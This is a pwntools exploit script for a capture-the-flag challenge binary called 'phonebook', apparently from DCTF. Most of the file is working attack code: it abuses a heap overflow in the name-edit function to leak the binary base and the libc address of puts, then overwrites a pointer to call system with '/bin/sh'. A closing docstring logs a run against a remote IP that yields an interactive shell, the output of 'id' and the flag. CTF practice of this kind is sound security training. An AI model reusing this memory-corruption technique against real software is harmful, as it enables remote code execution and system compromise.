#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('phonebook_patched_patched')
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
b* main
source /home/nasm/Downloads/pwndbg/gdbinit.py
continue
'''.format(**locals())

io = None

def GetOffsetStdin():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process(exe.path)
    p.sendline(pwn.cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def GetOffsetArgv():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process([exe.path, pwn.cyclic(512)])
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst

pwn.context.timeout = 0.2

io = start()

def alloc(id, length, name, number, relation):
    """
    print(io.recvline(b"> "))
    print(io.recvline(b"> "))
    print(io.recvline(b"> "))
    print(io.recvline(b"> "))
    print(io.recvline(b"> "))
    print(io.recvline(b"> "))
    print(io.recvline(b"> "))
    """
    io.sendlineafter(b"note\n", b"1")
    io.sendlineafter(b"Choose person id: ", str(id).encode())
    io.sendlineafter(b"Name length: ", str(length).encode())
    io.sendlineafter(b"Name: ", name)
    io.sendlineafter(b"Phone number: ", number)
    io.sendlineafter(b"> ", relation)

def edit_name(id, size, new_name):
    io.sendlineafter(b"note\n", b"2")
    io.sendlineafter(b"Choose person id: ", str(id).encode())
    io.sendlineafter(b"relation\n", b"1")
    io.sendlineafter(b"Name length: ", str(size).encode())
    io.sendlineafter(b"Name: ", new_name)

def edit_num(id, num):
    io.sendlineafter(b"note\n", b"2")
    io.sendlineafter(b"Choose person id: ", str(id).encode())
    io.sendlineafter(b"relation\n", b"2")
    io.sendafter(b"Enter new phone number: ", num)

def edit_relation(id, relation):
    io.sendlineafter(b"note\n", b"2")
    io.sendlineafter(b"Choose person id: ", str(id).encode())
    io.sendlineafter(b"relation\n", b"3")
    io.sendlineafter(b"vers\n", str(relation).encode())

def show(id):
    io.sendlineafter(b"note\n", b"3")
    io.sendlineafter(b"Choose person id: ", str(id).encode())
    io.recvline()
    return io.recvuntil(b"How")

# Hidden note: 
def hidden(data):
    io.sendlineafter(b"note\n", b"5")
    io.sendlineafter(b"note: ", data)

alloc(0, 0x100-1, b"A"*(0x100-1), b"0"*7, b"3")
edit_num(0, b"1"*8)
edit_relation(0, 3)

bin_leak = pwn.u64((show(0)[len("Calling... 11111111"):-4]).ljust(8, b"\x00")) - 0x12a1
pwn.log.info(f"binary: {hex(bin_leak)}")
puts_got = bin_leak + 0x3fa0

edit_name(0, 0x20, b"aaa")
alloc(1, 0x100-1, b"A"*(0x100-1), b"0"*7, b"3")
edit_name(0, 0xfe, b"a"*0x20 + pwn.p64(0) + pwn.p64(0x31) + b"1"*8 + pwn.p64(bin_leak + 0x12a1) + pwn.p64(puts_got))

show(1)
leak_libc = pwn.u64(io.recvline()[len(" you doin "):-len("------------------------------------------------------------\n")].ljust(8, b"\x00")) - 0x84450
pwn.log.info(f"libc @ {hex(leak_libc)}") 
pwn.log.info(f"system @ {hex(leak_libc + 0x522c0)}") 


edit_name(0, 0xfe, b"a"*0x20 + pwn.p64(0) + pwn.p64(0x31) + b"/bin/sh\0" + pwn.p64(leak_libc + 0x522c0) + pwn.p64(puts_got))
show(1)

"""
nasm@off:~/Documents/phonebook/chall$ python3 exploit.py REMOTE HOST=51.124.222.205 PORT=13380
[*] '/home/nasm/Documents/phonebook/chall/phonebook_patched_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Opening connection to 51.124.222.205 on port 13380: Done
[*] binary: 0x558980fdd000
[*] libc @ 0x7fabfec57000
[*] system @ 0x7fabfeca92c0
[*] Switching to interactive mode
$ id
uid=1337 gid=1337 groups=1337
$ cat flag.txt
DCTF{C4n_1_g3t_y0ur_numb3r?}
"""

io.interactive()
